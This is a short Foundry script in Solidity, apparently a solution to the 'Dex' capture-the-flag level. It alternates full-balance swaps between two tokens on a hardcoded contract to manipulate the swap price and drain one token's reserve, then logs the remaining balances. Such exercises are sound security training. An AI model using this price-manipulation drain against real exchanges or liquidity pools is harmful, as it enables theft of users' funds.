// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../../src/22/Dex.sol";

contract DexScript is Script{

    Dex dex = Dex(0x9584fDf78dFbC76182b3337A5F74CF09Fd420dD4);

    function run() public{

        address token1 = dex.token1();
        address token2 = dex.token2();
        address myAddrr = 0xF93eE28F72069752A808bbF56f9dB51952475AE0;

        vm.startBroadcast();
        dex.approve(address(dex), type(uint256).max);

        _swap(token1, token2, dex.balanceOf(token1, myAddrr));
        _swap(token2, token1, dex.balanceOf(token2, myAddrr));
        _swap(token1, token2, dex.balanceOf(token1, myAddrr));
        _swap(token2, token1, dex.balanceOf(token2, myAddrr));
        _swap(token1, token2, dex.balanceOf(token1, myAddrr));

        _swap(token2, token1, 45);

        console.log(dex.balanceOf(token1, address(dex)));
        console.log(dex.balanceOf(token2, address(dex)));

        vm.stopBroadcast();
    }


    function _swap(address _from, address _to, uint256 _amount) private{
        dex.swap(_from, _to, _amount);
    }

}